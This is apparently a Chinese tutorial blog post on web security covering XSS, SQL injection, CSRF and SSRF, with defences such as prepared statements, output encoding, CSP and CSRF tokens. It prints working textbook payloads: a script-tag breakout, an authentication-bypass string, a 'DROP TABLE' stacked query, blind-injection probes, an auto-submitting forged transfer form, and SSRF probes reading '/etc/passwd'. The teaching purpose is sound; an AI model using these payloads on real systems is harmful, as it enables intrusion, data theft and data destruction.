---
title: Web 安全
date: 2020-07-12 13:00:00
categories: Security
tags:
  - security
---

Web 安全，是指所有基于 HTTP 或者其他超文本传输协议（RPC 等）开发的应用，包括：网页、App、API 接口等等。这类应用的共同点是：通过 HTTP 等文本协议，在客户端和服务端之间进行数据交换。

<!--more-->

## XSS 攻击

### XSS 攻击是如何产生的？

作为最普遍的网页语言，HTML 非常灵活，你可以在任意时候对 HTML 进行修改。但是，这种灵活性也给了黑客可趁之机：通过给定异常的输入，黑客可以在你的浏览器中，插入一段恶意的 JavaScript 脚本，从而窃取你的隐私信息或者仿冒你进行操作。这就是 XSS 攻击（Cross-Site Scripting，跨站脚本攻击）的原理。

三种 XSS 攻击，它们分别是：反射型 XSS、基于 DOM 的 XSS 以及持久型 XSS。

### 反射型 XSS

假设现在有一个搜索网页，当你输入任意一个关键词，并点击“搜索”按钮之后，这个网页就会给你展示“你搜索的结果内容是：XXX”。

以 PHP 为例，这个网页的服务端实现逻辑如下所示：

```php
<!DOCTYPE html>
<html>
  <body>
    <form role="search" action="" method="GET">
      <input type="text" name="search" placeholder="请输入要搜索的内容">
          <button type="submit">搜索</button>
      </form>
    <?php
      if (isset($_GET['search']) && !empty($_GET['search'])) {
        $search = $_GET['search'];
        echo "<h3>你搜索的结果内容是：" . $search . "</h3>";
      }
    ?>
  </body>
</html>
```

这段代码的逻辑是将搜索框输入的内容，拼接成字符串，然后填充到最终的 HTML 中。而且这个过程中没有任何的过滤措施，如果黑客想要对这个过程发起攻击，他会输入下面这行代码：

```html
</h3><script>alert('xss');</script><h3>
```

黑客输入这段字符后，网页会弹出一个告警框（我自己测试的时候，发现部分浏览器，如 Safari 不会弹出告警框，这是因为浏览器自身提供了一定的 XSS 保护功能）。

这就是我们所说的反射型 XSS 攻击的过程。其实它攻击的原理很简单。我们可以总结一下，即通过开头的`</h3>`和结尾的`<h3>`，将原本的`<h3>`标签进行闭合，然后中间通过`<script>`标签插入 JavaScript 代码并执行，就完成了整个反射型 XSS 的流程。

你可以注意一下浏览器的地址：`http://localhost/index.php?search=<%2Fh3><script>alert('xss')%3B<%2Fscript><h3>` 。实际上，任何人只要点击了这个链接，就会执行一段黑客定义的 JavaScript 脚本。所以，我们经常说，不要点击任何未知的链接。

反射型 XSS 的总体流程看下面这张图。黑客诱导你点击了某个链接，这个链接提供的服务，可能就是上述的搜索功能。网页在解析到链接的参数后，执行正常的搜索逻辑，但是因为漏洞，网页中被填入了黑客定义的脚本。使得用户的浏览器，最终执行的是黑客的脚本。

![1][1]

### 基于 DOM 的 XSS

反射型 XSS 产生在前后端一体的网页应用中，服务端逻辑会改变最终的网页代码。但是，目前更流行的其实是前后端分离，这样网页的代码不会受服务端影响。那么，这样是不是就安全了呢？

显然不是的。尽管服务端无法改变网页代码，但网页本身的 JavaScript 仍然可以改变。而黑客只要利用了这一点，同样能够在网页中插入自己的脚本。这也就是所谓的基于 DOM 的 XSS 漏洞。

对于上述搜索功能，通过前后端分离，它的源码就变成了下面这样：

```html
<!DOCTYPE html>
<html>
  <body>
    <form role="search" action="" method="GET">
      <input type="text" name="search" placeholder="请输入要搜索的内容">
          <button type="submit">搜索</button>
      </form>
      <script>
        var search = location.search.substring(8);
        document.write('你搜索的结果内容是：' + decodeURIComponent(search));
      </script>
  </body>
</html>
```

这段代码能够实现和之前的 PHP 代码相同的逻辑：当你在搜索框点击搜索关键词之后，网页会展示你输入的关键词。只不过，HTML 是通过 JavaScript 脚本修改DOM来实现这个功能的。

那么和上述例子一样，在基于 DOM 的 XSS 中，黑客也可以通过插入一段`<script>alert('xss');</script>`来执行指定的 JavaScript 脚本。基于 DOM 的 XSS 总体流程如下图所示。可以看到，这个流程其实和反射型 XSS 一致，只是不需要经过服务端了而已。

![2][2]

### 持久型 XSS

你可以回想一下，当你在网页中搜索一个关键词时，实际上与这个关键词相关的所有搜索结果都会被展示出来。一旦这些搜索结果中，包含黑客提供的某个恶意 JavaScript 脚本，那么只要我们浏览了这个网页，就有可能会执行这些脚本。这就是持久型 XSS。因为这些恶意的搜索结果，会长期保存在服务端数据库中，所以它又叫作存储型 XSS。在应用中，存储用户的输入并对它们进行展示的地方，都可能出现持久型 XSS。比如：搜索结果、评论、博文等等。

有了前面的铺垫，持久型 XSS 的产生过程就很好理解了。

![3][3]

相比前面两种 XSS 攻击来说，持久型 XSS 往往具备更强的危害性。因为对于一个反射型或者基于 DOM 的 XSS 来说，需要黑客诱导用户点击恶意的 URL，才能够成功地在用户浏览器上执行 JavaScript 脚本。这对黑客在诱导用户操作方面的能力提出了考验：并不是所有的用户都是小白，一些有经验的用户会在点击链接前进行一定的考虑。

而持久型 XSS 则不同，它是将恶意的 JavaScript 脚本写入到了正常的服务端数据库中，因此，只要用户正常的使用业务功能，就会被注入 JavaScript 脚本。所以说，持久型 XSS 在传播速度和传播范围上，会远远超出其他类型的 XSS。

### 通过 XSS 攻击，黑客能做什么？

#### 窃取 Cookie

从上面的例子中，我们可以看到，黑客可以窃取用户的 Cookie。因为黑客注入的 JavaScript 代码是运行在 server.com 这个域名下的，因此，黑客可以在 JavaScript 中通过 document.cookie 获得 Cookie 信息。

另外，需要我们注意的是，受SOP（Same Origin Policy，同源策略）保护，我们在 server.com 中是无法直接向 hacker.com 发送 GET 或者 POST 请求的。这也是为什么，在上面的例子中，我们需要通过 window.location 来执行跳转操作，间接地将 Cookie 信息发送出去。除了 window.location 之外，我们还可以通过加载 JavaScript 文件、图片等方式，向 attacker.com 发送带有 Cookie 的 GET 请求。

#### 未授权操作

除了窃取敏感信息以外，黑客还可以利用 JavaScript 的特性，直接代替用户在 HTML 进行各类操作。

如：黑客就利用 JavaScript 脚本，让用户发送了一个微博，微博中同时还带有反射型 XSS 的链接。这样一来，每个点击链接的用户都会通过微博的形式，诱导更多的用户点击链接，一传十、十传百，造成大范围的传播。

#### 按键记录和钓鱼

窃取 Cookie 和未授权操作都是我们很容易想到的危害，除此之外，JavaScript 还能做什么呢？

JavaScript 的功能十分强大，它还能够记录用户在浏览器中的大部分操作。比如：鼠标的轨迹、键盘输入的信息等。也就是说，你输入的账号名和密码，都可以被 JavaScript 记录下来，从而被黑客获取到。

另外，即使某个存在 XSS 漏洞的页面不具备任何输入框，黑客还可以通过修改 DOM，伪造一个登录框，来诱导用户在本不需要登录的页面，去输入自己的用户名和密码。这也是“钓鱼”的一种形式，在这个过程中用户访问的域名是完全正常的，只是页面被篡改了，所以具备更高的迷惑性。

### 如何进行 XSS 防护？

#### 验证输入 OR 验证输出

防护的核心原则是：一切用户输入皆不可信。你的第一反应一定是，这很好实现啊，当接收到用户的输入时，我们就进行验证，这不就做到了吗？实际上并不是这么简单的，我们还是通过搜索这个例子来看。在用户点击“搜索”按钮之后，如果我们马上对他输入的内容进行验证，这样就会产生两个问题。

1. 你将无法保存用户的原始输入信息。这样一来，当出现了 Bug 或者想要对黑客行为进行溯源时，你只能“推断”，而不能准确地获取用户的原始输入。
2. 用户的内容可能会被多种语言获取和使用，提前编码或者处理，将产生未知的问题。比如，在旧版本的 PHP 中，就存在“magic quotes”的漏洞，因为 PHP 无法处理某些编码的字符而导致崩溃。

因此，我更推荐在需要输出的时候去进行验证，即当需要展示的时候，我们再对内容进行验证，这样我们就能够根据不同的环境去采取不同的保护方案了。

在 HTML 中，常见的 XSS 注入点我已经总结好了，你可以看下面这个表格：

![4][4]

#### 编码

现在，我们已经理解了，XSS 防护的核心原则就是验证，那具体该怎么去做验证呢？我认为，我们可以优先采用编码的方式来完成。所谓编码，就是将部分浏览器识别的关键词进行转换（比如 < 和 >），从而避免浏览器产生误解。对于客户端来说，编码意味着，使用 JavaScript 提供的功能对用户内容进行处理。具体的方法我也总结了一下，你可以看这个表格。

![5][5]

#### 检测和过滤

但是，在很多时候，编码会对网页实际的展现效果产生影响。比如，原本用户可能想展示一个 1>0，却被编码展示成了 1&gt0。尽管网络环境安全了，却对用户造成了困扰。那么，我们还可以采取哪些方法进行验证呢？

首先，我们需要对用户的内容进行检测。在这里，我们可以采用黑名单和白名单的规则。黑名单往往是我们最直接想到的方法：既然黑客要插入`<javascript>`标签，那么我们就检测用户内容中是否存在`<javascript>`标签就好了。

但是，黑客的攻击方法是无穷无尽的。你检测了`<javascript>`，黑客就可以改成`<JavaScript>`（因为 HTML 标签对大小写不敏感），甚至有些时候还能够编码成`&#106;avascript`等等。另外，HTML5 的发展速度很快，总是有新的标签被开发出来，这些新标签中也可能包含新的注入点。因此，黑名单的更新和维护过程，是需要我们和黑客进行长期对抗的过程。

所以，在检测中，我更推荐使用白名单的规则。因为白名单的规则比较简单，并且十分有效。比如，在只输入一个分数的地方，规定只有整型变量是合法的。这样一来，你就能够检测出 99.99% 的攻击行为了。

那当发现某个用户的内容可能存在 XSS 攻击脚本时，这个时候，处理选项有两个：拒绝或者过滤。毫无疑问，拒绝是最安全的选项。一旦你发现可能的 XSS 攻击脚本，只要不将这段用户内容展现出来，就能避免可能的攻击行为。

但是，拒绝会阻碍用户的使用流程，从用户体验的角度上来考虑的话，过滤会更被用户所接受。上面提到的编码就属于一种过滤的方式。除此之外，我们也可以直接对敏感字符进行替换删除等。需要注意的是，在替换的时候，一定不能采取黑名单的形式（比如：将 javascript 进行删除，那黑客就可以通过 JavaScript 来绕过），而是应该采取白名单的形式（比如，除了 div 之外的标签全部删除）。

同样地，过滤的流程也必须彻底。比如，我看到过有人采用下面这行字符串来过滤 javascript 标签：

```php
$str=str_replace('<javascript>','',$str);
```

但黑客只需要将 str 的值变成`<java<javascript>script>`就可以了，因为`str_replace('<javascript>','','<java<javascript>script>')`的结果就是`<javascript>`。

#### CSP

面对 XSS 这样一个很普遍的问题，W3C 提出了 CSP（Content Security Policy，内容安全策略）来提升 Web 的安全性。所谓 CSP，就是在服务端返回的 HTTP header 里面添加一个 Content-Security-Policy 选项，然后定义资源的白名单域名。浏览器就会识别这个字段，并限制对非白名单资源的访问。

配置样例如下所示：

```html
Content-Security-Policy:default-src ‘none’; script-src ‘self’; 
connect-src ‘self’; img-src ‘self’; style-src ‘self’;
```

那我们为什么要限制外域资源的访问呢？这是因为 XSS 通常会受到长度的限制，导致黑客无法提交一段完整的 JavaScript 代码。为了解决这个问题，黑客会采取引用一个外域 JavaScript 资源的方式来进行注入。除此之外，限制了外域资源的访问，也就限制了黑客通过资源请求的方式，绕过 SOP 发送 GET 请求。目前，CSP 还是受到了大部分浏览器支持的，只要用户使用的是最新的浏览器，基本都能够得到很好的保护。

**小结**

简单来说，XSS 就是利用 Web 漏洞，在用户的浏览器中执行黑客定义的 JavaScript 脚本，这样一种攻击方式。根据攻击方式的不同，可以分为：反射型 XSS、基于 DOM 的 XSS 和持久型 XSS。通过在用户的浏览器中注入脚本，黑客可以通过各种方式，采集到用户的敏感信息，包括：Cookie、按键记录、密码等。

预防 XSS 主要通过对用户内容的验证来完成。首先，我推荐在需要展示用户内容的时候去进行验证，而不是当用户输入的时候就去验证。在验证过程中，我们优先采用编码的方式来完成。如果编码影响到了业务的正常功能，我们就可以采用白名单的检测和过滤方式来进行验证。除此之外，我们可以根据业务需要，配置合适的 CSP 规则，这也能在很大程度上降低 XSS 产生的影响。

![6][6]

## SQL注入

### SQL 注入攻击是如何产生的？

通常来说，我们会将应用的用户信息存储在数据库中。每次用户登录时，都会执行一个相应的 SQL 语句。这时，黑客会通过构造一些恶意的输入参数，在应用拼接 SQL 语句的时候，去篡改正常的 SQL 语意，从而执行黑客所控制的 SQL 查询功能。这个过程，就相当于黑客“注入”了一段 SQL 代码到应用中。这就是我们常说的 SQL 注入。

SQL 注入方式

#### 修改 WHERE 语句

我们先来看一个例子。现在有一个简单的登录页面，需要用户输入 Username 和 Password 这两个变量来完成登录。具体的 Web 后台代码如下所示：

```java
uName = getRequestString("username");
uPass = getRequestString("password");
sql = 'SELECT * FROM Users WHERE Username ="' + uName + '" AND Password ="' + uPass + '"'
```

当用户提交一个表单（假设 Username 为 admin，Password 为 123456）时，Web 将执行下面这行代码：

```sql
SELECT * FROM Users WHERE Username ="admin" AND Password ="123456"
```

用户名密码如果正确的话，这句 SQL 就能够返回对应的用户信息；如果错误的话，不会返回任何信息。因此，只要返回的行数≥1，就说明验证通过，用户可以成功登录。

所以，当用户正常地输入自己的用户名和密码时，自然就可以成功登录应用。那黑客想要在不知道密码的情况下登录应用，他又会输入什么呢？他会输入 " or ""="。这时，应用的数据库就会执行下面这行代码：

```sql
SELECT * FROM Users WHERE Username ="" AND Password ="" or ""=""
```

我们可以看到，WHERE 语句后面的判断是通过 or 进行拼接的，其中""=""的结果是 true。那么，当有一个 or 是 true 的时候，最终结果就一定是 true 了。因此，这个 WHERE 语句是恒为真的，所以，数据库将返回全部的数据。

这样一来，我们就能解答文章开头的问题了，也就是说，黑客只需要在登录页面中输入 " or ""="，就可以在不知道密码的情况下，成功登录后台了。而这，也就是所谓的“万能密码”。而这个“万能密码”，其实就是通过修改 WHERE 语句，改变数据库的返回结果，实现无密码登录。

#### 执行任意语句

大部分的数据库都支持多语句执行。在 MySQL 中，实现任意语句执行最简单的方法，就是利用分号将原本的 SQL 语句进行分割。这样，我们就可以一次执行多个语句了。比如，下面这个语句在执行的时候会先插入一个行，然后再返回 Users 表中全部的数据。

```sql
INSERT INTO Users (Username, Password) VALUES("test","000000"); SELECT * FROM Users;
```

接下来，我们来看一个具体的例子。在用户完成登录后，应用通常会通过 userId 来获取对应的用户信息。其 Web 后台的代码如下所示：

```java
uid = getRequestString("userId");
sql = "SELECT * FROM Users WHERE UserId = " + uid;
```

在这种情况下，黑客只要在传入的 userId 参数中加入一个分号，就可以执行任意的 SQL 语句了。比如，黑客想“删库跑路”的话，就令 userId 为 1;DROP TABLE Users，那么，后台实际执行的 SQL 就会变成下面这行代码，而数据库中所有的用户信息就都会被删除。

```sql
SELECT * FROM Users WHERE UserId = 1；DROP TABLE Users
```

### 通过 SQL 注入攻击，黑客能做什么？

#### 绕过验证

在上面的内容中，我们已经介绍过，" or ""=" 作为万能密码，可以让黑客在不知道密码的情况下，通过登录认证。因此，SQL 注入最直接的利用方式，就是绕过验证，也就相当于身份认证被破解了。

#### 任意篡改数据

除了绕过验证，我们在任意语句执行的部分中讲到，SQL 注入漏洞导致黑客可以执行任意的 SQL 语句。因此，通过插入 DML 类的 SQL 语句（INSERT、UPDATE、DELETE、TRUNCATE、DROP 等），黑客就可以对表数据甚至表结构进行更改，这样数据的完整性就会受到损害。比如上面例子中，黑客通过插入 DROP TABLE Users，删除数据库中全部的用户。

#### 窃取数据

在 XSS 漏洞中，黑客可以通过窃取 Cookie 和“钓鱼”获得用户的隐私数据。那么，在 SQL 注入中，黑客会怎么来获取这些隐私数据呢？

在各类安全事件中，我们经常听到“拖库”这个词。所谓“拖库”，就是指黑客通过类似 SQL 注入的手段，获取到数据库中的全部数据（如用户名、密码、手机号等隐私数据）。最简单的，黑客利用 UNION 关键词，将 SQL 语句拼接成下面这行代码之后，就可以直接获取全部的用户信息了。

```sql
SELECT * FROM Users WHERE UserId = 1 UNION SELECT * FROM Users
```

#### 消耗资源

SQL 注入破坏可用性十分简单，可以通过完全消耗服务器的资源来实现。比如，在 Web 后台中，黑客可以利用 WHILE 打造死循环操作，或者定义存储过程，触发一个无限迭代等等。在这些情况下，数据库服务器因为 CPU 被迅速打满，持续 100%，而无法及时响应其他请求。

总结来说，通过 SQL 注入攻击，黑客可以绕过验证登录后台，非法篡改数据库中的数据；还能执行任意的 SQL 语句，盗取用户的隐私数据影响公司业务等等。所以，我认为，SQL 注入相当于让黑客直接和服务端的数据库进行了交互。正如我们一直所说的，应用的本质是数据，黑客控制了数据库，也就相当于控制了整个应用。

### 如何进行 SQL 注入防护 ？

三种常见的防护方法，它们分别是：使用 PreparedStatement、使用存储过程和验证输入。

#### 使用 PreparedStatement

通过合理地使用 PreparedStatement，我们就能够避免 99.99% 的 SQL 注入问题。当数据库在处理一个 SQL 命令的时候，大致可以分为两个步骤：

- 将 SQL 语句解析成数据库可使用的指令集。我们在使用 EXPLAIN 关键字分析 SQL 语句，就是干的这个事情；
- 将变量代入指令集，开始实际执行。之所以在批量处理 SQL 的时候能够提升性能，就是因为这样做避免了重复解析 SQL 的过程。

SQL 注入是在解析的过程中生效的，用户的输入会影响 SQL 解析的结果。因此，我们可以通过使用 PreparedStatement，将 SQL 语句的解析和实际执行过程分开，只在执行的过程中代入用户的操作。这样一来，无论黑客提交的参数怎么变化，数据库都不会去执行额外的逻辑，也就避免了 SQL 注入的发生。

在 Java 中，我们可以通过执行下面的代码将解析和执行分开：

```java
String sql = "SELECT * FROM Users WHERE UserId = ?";
PreparedStatement statement = connection.prepareStatement(sql);
statement.setInt(1, userId); 
ResultSet results = statement.executeQuery();
```

PreparedStatement 为 SQL 语句的解析和执行提供了不同的“方法”，你需要分开来调用。但是，如果你在使用 PreparedStatement 的时候，还是通过字符串拼接来构造 SQL 语句，那仍然是将解析和执行放在了一块，也就不会产生相应的防护效果了。我这里给你展示了一个错误案例，你可以和上面的代码进行对比。

```java
String sql = "SELECT * FROM Users WHERE UserId = " + userId;
PreparedStatement statement = connection.prepareStatement(sql);
ResultSet results = statement.executeQuery();
```

#### 使用存储过程

实际上，它的原理和使用 PreparedStatement 类似，都是通过将 SQL 语句的解析和执行过程分开，来实现防护。区别在于，存储过程防注入是将解析 SQL 的过程，由数据库驱动转移到了数据库本身。

还是上述的例子，使用存储过程，我们可以这样来实现：

```sql
delimiter $$　　-- 将语句的结束符号从分号;临时改为两个$$(可以是自定义)
CREATE PROCEDURE select_user(IN p_id INTEGER)
BEGIN
　 SELECT * FROM Users WHERE UserId = p_id;
END$$ 
delimiter;　　-- 将语句的结束符号恢复为分号
call select_user(1);
```

#### 验证输入

防护的核心原则是，一切用户输入皆不可信。因此，SQL 注入的防护手段和 XSS 其实也是相通的，主要的不同在于：

- SQL 注入的攻击发生在输入的时候，因此，我们只能在输入的时候去进行防护和验证；
- 大部分数据库不提供针对 SQL 的编码，因为那会改变原有的语意，所以 SQL 注入没有编码的保护方案。

因此，对所有输入进行验证或者过滤操作，能够很大程度上避免 SQL 注入的出现。比如，在通过 userId 获取 Users 相关信息的示例中，我们可以确认 userId 必然是一个整数。因此，我们只需要对 userId 参数，进行一个整型转化（比如，Java 中的 Integer.parseInt，PHP 的 intval），就可以实现防护了。

#### 盲注

```sql
SELECT Username FROM Users WHERE UserId = 1
```

你现在已经知道，WHERE 语句中存在了 SQL 注入的点。那么，我们怎么才能获取到除了 Username 之外的其他字段呢？

首先盲注应该也是通过 web 端的输入来实现黑客的入侵目的的，那么黑客就可以通过观察页面的反应来动态修改自己的注入参数。比如一些提交输入框，当我们提交了参数之后页面反应正常那么就说明我们的猜测是正确的，否则继续猜。

我们都知道 MySQL 内部有一个 information_schema 的库，里面都是数据裤的元信息，那么我们就可以利用这个库进行猜测，通过观察页面的反应来验证自己的猜测是否正确。

第一步我们要知道数据的名字，那么就先猜测其长度。以下我们会用到 DATABASE(), LENGTH(), SUBSTRING(), ASCII() 四个内置函数。

1. 确定数据库长度

```sql
-- 得到数据库长度之后猜测数据库名字的每个字母。
SELECT name FROM user WHERE id = 1 AND (SELECT LENGTH(DATABASE()) = 4);
```

2. 确定数据库名字 通过 ASCII 码方式

```sql
-- 根据 ASCII 码猜测是可以使用二分法来猜测。假设的到的结果是 test。
-- 得到数据库名字之后，猜测 user 表有多少个列。
SELECT name FROM user WHERE id = 1 AND (SELECT ASCII(SUBSTRING(DATABASE(), 1, 1)) < 128);
```

3. 获取该表有多少列

```sql
-- 获取到列的多少列之后，就可以获取到每一列的长度了。
SELECT name FROM user WHERE id = 1 AND ((SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_name = 'user' AND TABLE_SCHEMA = 'test') = 3);
```

4. 获取列长

```sql
-- 最后，获取每一列的具体值。
SELECT name FROM user WHERE id = 1 AND ((SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_name = 'user' AND TABLE_SCHEMA = 'test' LIMIT 0, 1) = 2);
```

5. 获取列名，同样是使用 ASCII 码方式

```sql
SELECT name FROM user WHERE id = 1 AND ((SELECT ASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.COLUMNS WHERE table_name = 'user' AND TABLE_SCHEMA = 'test' LIMIT 0, 1) < 120)
```

为了故事的顺利发展这里我假设我们已知表名 user，但是我们可以根据同样的逻辑从 information_schema.TABLES 表中获取 test 库的所有表信息。

最后，我感觉这个方式有点傻啊，因为它依赖一些很特定的条件，比如后端没有做 SQL 注入的防护，而且还必须结合前端页面的反应。

<pre style="display:none;">

<!--

1. 先判断字段的第一个字符是否在a-z中，如下所示，

```sql
select Username from Users where UserId = 1 and 1 = (select 1 from information_schema.columns WHERE table_name='Users’ and COLUMN_NAME REGEXP '^[a-z]')
```

如果结果显示Username那就说明字段的第一个字符在a到z中，

2. 使用二分查找法在a到z之间查找第一个字符，如下语句，

```sql
select Username from Users where UserId = 1 and 1 = (select 1 from information_schema.columns WHERE table_name='Users’ and COLUMN_NAME REGEXP '^a[a-z]')
```

如果能显示Username，那么就说明a是第一个字符，再依次去查第二个字符，反之，换一个字符再试。

3. 以此类推，可以找到所有的字段名。

顺便说下，字段名中可能包含其他字符，如 _ 等，可以在正则表达式中同样去匹配。

-->

</pre>

**小结**

![7][7]

## CSRF/SSRF

前面 2 种常见的 Web 攻击：XSS 和 SQL 注入。它们分别篡改了原始的 HTML 和 SQL 逻辑，从而使得黑客能够执行自定义的功能。那么除了对代码逻辑进行篡改，黑客还能通过什么方式发起 Web 攻击呢？

我们还是先来看一个例子。在平常使用浏览器访问各种网页的时候，是否遇到过，自己的银行应用突然发起了一笔转账，又或者，你的微博突然发送了一条内容？

在我们学习 XSS 之后，你可能会联想到，这是银行或者微博中出现了某个 XSS 漏洞。但问题是，你今天并没有访问过银行或者微博的页面，所以并没有“被 XSS”的机会。这时，你想到，会不会是你今天访问的其他网页里存在一些恶意的攻击，实现了你不知道的转账和发博行为呢？

### CSRF 攻击是如何产生的？

当我们在访问一个 Web 页面的时候，并不是我们自己去获取页面信息，而是浏览器去获取了这些信息，并将它们进行了展示。这就说明，你允许浏览器代表你去和 Web 的服务端进行交互。为了能够准确地代表你的身份，浏览器通常会在 Cookie 中存储一些必要的身份信息。所以，在我们使用一个网页的时候，只需要在首次访问的时候登录就可以了。

从用户体验上来说，这当然是非常方便的。但是，黑客正是利用这一点，来编写带有恶意 JavaScript 脚本的网页，通过“钓鱼”的方式诱导你访问。然后，黑客会通过这些 JavaScript 脚本窃取你保存在网页中的身份信息，通过仿冒你，让你的浏览器发起伪造的请求，最终执行黑客定义的操作。而这一切对于你自己而言都是无感知的。这就是 CSRF（Cross-Site Request Forgery，跨站请求伪造）攻击。

接下来，我们就以银行转账为例子，来详细讲解一下这个攻击过程。

当你在银行页面发起一笔转账时，这个过程其实是通过一个转账接口来完成的。这个接口的内容可能包括下面这些内容：

- 接口地址：http://bank.com/transfer ；
- HTTP 方法：POST；
- 接口参数：to（目标账户）、amount（金额）。

在转账之前，你肯定进行了一次登录。这样一来，这个转账接口就可以通过你之前存储在 Cookie 中的相关字段来完成认证了。所以，这个接口参数中不需要包含任何身份认证相关的信息。也正是因为如此，这个接口满足了 CSRF 攻击的基本条件：

- 使用 Cookie 进行认证；
- 参数中不包含任何隐私信息。

于是，黑客可以构造一个如下的空白网页。我们假设这个网页的地址为 hacker.com。

```html
<html>
  <body>
    <form action="http://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="hacker" />
      <input type="hidden" name="amount" value="10000.00" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

在 HTML 中，`<script>`标签内的 JavaScript 脚本会在打开网页的时候自动执行。因此，一旦用户访问了这个 hacker.com 的页面，它就会自动提交 form 表单，向http://bank.com/transfer这个接口（假设为转账接口）发起一个 POST 请求。

其中，to 和 amount 这两个参数，代表着用户向黑客的账号转账 10000 元。只要这个用户之前登录过 bank.com，并且账户余额大于 10000 元，那么黑客就能够成功地收到这 10000 元的转账了。在这个网页中，`<input>`的标签带有“hidden”属性，所以这整个过程对于用户来说都是不可见的。

![8][8]

### 通过 CSRF 攻击，黑客能做什么？

和 XSS 一样，CSRF 也可以仿冒用户去进行一些功能操作的请求，比如修改密码、转账等等，相当于绕过身份认证，进行未授权的操作。

值得一提的是，尽管黑客通过 CSRF 能进行的操作没有 XSS 丰富，但 CSRF 在传播和攻击成本上都低于 XSS。这也就是说，即使你的网页中没有任何注入漏洞，但只要接口配置不当，就能够被 CSRF 利用。而黑客也只需要在自己的域名中，搭建一个诱导性的网页，就可以让任何访问网页的用户都遭受到 CSRF 攻击。而且，用户每天需要访问大量的网页，根本没有办法确认每一个网页的合法性。而从严格意义上来说，用户根本没有办法防止 CSRF 攻击。因此，我们只能从应用本身入手去加强防护。

### 如何进行 CSRF 防护？

那究竟该怎么进行 CSRF 防护呢？我们有两种方法。行业内标准的 CSRF 防护方法是 CSRFToken。 我们先来看这个方法。

通过前面的学习，我们知道，CSRF 是通过自动提交表单的形式来发起攻击的。所以，在前面转账的例子中，黑客可以通过抓包分析出 http://bank.com/transfer 这个接口所需要的参数，从而构造对应的 form 表单。因此，我们只需要在这个接口中，加入一个黑客无法猜到的参数，就可以有效防止 CSRF 了。这就是 `CSRF Token` 的工作原理。

![9][9]

因为 CSRF Token 是每次用户正常访问页面时，服务端随机生成返回给浏览器的。所以，每一次正常的转账接口调用，都会携带不同的 CSRF Token。黑客没有办法进行提前猜测，也就没有办法构造出正确的表单了。

**除了 CSRF Token 之外，我们也可以通过二次验证来加强防护。**

回想一下，当你进行各类支付操作的时候，银行网页通常会要求你输入支付密码。你可能会觉得奇怪，明明自己已经登录了，为什么还需要输入一个独立的支付密码呢？这其实和 CSRF Token 的原理一样：这个独立的支付密码是需要用户输入的，只存在于用户的记忆中，因此，也是黑客无法获取到的参数。

怎么理解呢？假如说，黑客通过 CSRF 攻击，替你发起了一笔转账。在支付的时候，银行会发起一个全新的页面，让你验证支付密码。这个时候你发现，这个支付请求不是你本人发起的，那你肯定不会输入支付密码来完成验证。所以，在用户进行支付这样的敏感操作时，应用通常会要求用户提供一些私密的信息，就是为了对 CSRF 攻击进行防护。

讲到这里，你现在对 CSRF 的攻击和防护，应该有了一个大概的了解。简单来说，CSRF 其实就是黑客利用浏览器存储用户 Cookie 这一特性，来模拟用户发起一次带有认证信息的请求，比如转账、修改密码等。防护 CSRF 的原理也很简单，在这些请求中，加入一些黑客无法得到的参数信息即可，比如 CSRF Token 或者独立的支付密码等。掌握了这些内容，其实 CSRF 的知识基本上就差不多了。

### SSRF：同样的原理，发生在服务端又会发生什么？

在 CSRF 中，黑客通过诱导用户访问某个网站，让用户的浏览器发起一个伪造的请求。那么，如果服务端发起了这个伪造的请求，又会发生什么呢？

我们知道，服务端也有代理请求的功能：用户在浏览器中输入一个 URL（比如某个图片资源），然后服务端会向这个 URL 发起请求，通过访问其他的服务端资源来完成正常的页面展示。

这个时候，只要黑客在输入中提交一个内网 URL，就能让服务端发起一个黑客定义的内网请求，从而获取到内网数据。这就是 SSRF（Server Side Request Forgery，服务端请求伪造）的原理。而服务端作为内网设备，通常具备很高的权限，所以，这个伪造的请求往往因为能绕过大部分的认证和授权机制，而产生很严重的后果。

比方说，当我们在百度中搜索图片时，会涉及图片的跨域加载保护，百度不会直接在页面中加载图片的源地址，而是将地址通过 GET 参数提交到百度服务器，然后百度服务器请求到对应的图片，再返回到页面展示出来。

这个过程中，百度服务器实际上会向另外一个 URL 地址发起请求（比如，上图中的http://s1.sinaimg.cn）。利用这个代理发起请求的功能，黑客可以通过提交一个内网的地址，实现对内网任意服务的访问。这就是 SSRF 攻击的实现过程，也就是我们常说的“内网穿透”。

![10][10]

### 通过 SSRF 攻击，黑客能做什么？

了解了 SSRF 攻击的过程之后，我们知道，在服务端不做任何保护措施的情况下，黑客可以利用 SSRF 向内网发起任意的 HTTP 请求。那么，这些请求会产生什么样的后果呢？我总结了一下，主要会有这样两种动作：内网探测和文件读取。

#### 内网探测

内外网一般是隔离的。所以，黑客在外网环境中，是无法知道内网有哪些服务器，这些服务器又分别提供了哪些服务。但是，通过一个加载图片的 SSRF 漏洞，黑客就能够对内网进行探测。

在前面百度搜图的例子中，我们请求的地址是：https://image.baidu.com/search/detail?objurl=http://s1.sinaimg.cn/picture.jpg。因为http://s1.sinaimg.cn/picture.jpg会正常返回一个图片，所以网页会展示出来对应的图片。

我们假定这样一个服务端逻辑：在这个请求过程中，服务端会判断 objurl 返回数据的 Content Type 是否为 image/jpeg。那么，可能的返回结果就有三种：

- “是”，则展示图片；
- “不是”，则返回“格式错误”；
- 无响应，则返回“找不到图片”。

基于这三种返回逻辑，黑客可以构造一个恶意的请求地址：https://image.baidu.com/search/detail?objurl=127.0.0.1:3306。如果服务器返回“格式错误”，则代表服务端本地的 3306 端口可用；如果返回“找不到图片”，则代表不可用。我们知道，3306 是 MySQL 对应的端口号，因此，根据这个返回的信息，黑客就能够知道服务端本地是否开启了一个 MySQL 服务。接下来，黑客只需要不断重复这个过程，尝试不同的 IP 和端口号，就能够一点一点探测出整个内网的结构。

#### 文件读取

服务器除了对图片的代理不做合法性判断之外，对很多其他的代理也不做判断，而是直接将代理的结果返回到前端。我们称这种情况为“有回显的 SSRF”。在这种情况下，黑客不仅能够知道请求是否成功了，还能够知道具体返回的内容。

在 URI 中，开头的 http:// 和 https:// 代表需要使用什么协议去进行请求。除了 HTTP 之外，URI 还有很多种协议可以选择，比如 file:// 就是直接读取本地的文件。通过输入 file://etc/passwd，黑客就能够通过一个请求获取到本地的 passwd 文件，从而知道本地有哪些用户。经过不断地尝试，黑客就能够把整个服务器中的文件内容都给拉取出来，这其中包括密钥、源码等极度敏感的信息。

